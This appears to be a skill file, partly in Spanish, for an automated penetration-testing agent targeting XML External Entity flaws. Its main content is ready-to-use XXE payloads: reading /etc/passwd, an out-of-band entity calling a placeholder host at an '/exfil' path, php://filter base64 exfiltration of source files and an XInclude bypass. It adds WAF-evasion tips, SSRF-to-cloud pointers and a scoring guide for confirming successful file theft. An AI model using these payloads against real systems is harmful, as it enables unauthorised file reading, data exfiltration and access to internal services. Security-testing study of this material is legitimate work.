# SKILL: XML EXTERNAL ENTITY (XXE)

<!-- critical -->
XXE ocurre cuando un procesador XML mal configurado permite la inclusión de entidades externas. Puede llevar a lectura de archivos locales (LFI), SSRF interno, DoS (Billion Laughs) y en algunos casos RCE.
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Endpoints que aceptan XML**: APIs SOAP, REST con Content-Type `application/xml`, `text/xml`.
- **Sube de archivos**: Formatos basados en XML como SVG, DOCX, XLSX, PDF, RSS.
- **Headers**: XMP en imágenes.
- **Funcionalidades**:
  - Importación de datos
  - Visualización de documentos office
  - SSO (SAML responses)
  - Mapas (GPX/KML)
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Verificar si el servidor acepta XML cambiando `Content-Type` de JSON a XML.
2. **BASIC TEST**: Inyectar una entidad interna y ver si se refleja en la respuesta.
3. **FILE READ**: Intentar leer `/etc/passwd` o `C:\Windows\win.ini` usando `SYSTEM`.
4. **OOB XXE**: Si no hay reflejo, usar un servidor OOB para detectar la resolución de la entidad.
5. **SSRF**: Usar la entidad para realizar un request a un servicio interno o cloud metadata.
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### Basic Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB (Out-of-Band)

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[INTERACTSH_URL]/xxe"> %xxe;]>
```

### PHP Wrapper (Exfiltración base64)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
```

### Advanced Bypasses

- **Encoding**: Usar UTF-16 o EBCDIC para evadir WAFs que solo ven UTF-8.
- **XInclude**: Si no se puede definir `DOCTYPE`, usar `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`.
- **Parameter Entities**: Usadas para OOB ciego o dentro de otros DTDs.

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** - Lectura exitosa de archivo o exfiltración | `root:x:0:0` en la respuesta o callback OOB con datos |
| **7-8** | **HIGH** - DNS/HTTP callback recibido (SSRF) | Petición a Interactsh desde la IP del servidor |
| **5-6** | **MEDIUM** - Error del XML Parser revelador | `IO Error: /etc/passwd (Permission denied)` |
| **3-4** | **LOW** - Web acepta XML pero bloquea entidades | Solo se procesa el XML literal |
| **0-2** | **REJECT** - Falso positivo claro | El XML se muestra como texto sin ser parseado |

**AUTO-SCORING KEYWORDS:**

- 9-10: "root:x:0:0", "[boot loader]", "HTTP callback received", "DNS resolved"
- 7-8: "ConnectException", "UnknownHostException"
- 5-6: "parser error", "entity not found", "access denied"
- 0-2: "EXPECTED: SAFE", "display only"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. El XML se refleja tal cual en el HTML (es un reflejo, no un parseo).
2. El error de "entidad no encontrada" es local del cliente/browser.
3. "EXPECTED: SAFE" explícito.

**NO SON FALSOS POSITIVOS:**

- Errores de "Protocol not supported" (Confirma que intentó parsear).
- Timeouts largos cuando se inyecta una URL interna (Indica SSRF).
- Errores de codificación (El parser llegó a procesar la entidad).

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE (LFI/SSRF)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### MEDIUM VALUE (Blind/OOB)

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[OOB_URL]/exfil"> %xxe;]>
```

### BYPASS (XInclude)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **Try different Content-Types**: A veces `application/xml` está bloqueado pero `text/xml` o `application/xhtml+xml` no.
2. **SSRF to Cloud**: XXE es una puerta directa a SSRF. Prueba los payloads de la Skill de SSRF aquí.
3. **SVG Upload**: Muchos procesadores de imágenes usan `libxml2`, que es vulnerable por defecto.
<!-- /pro_tips -->
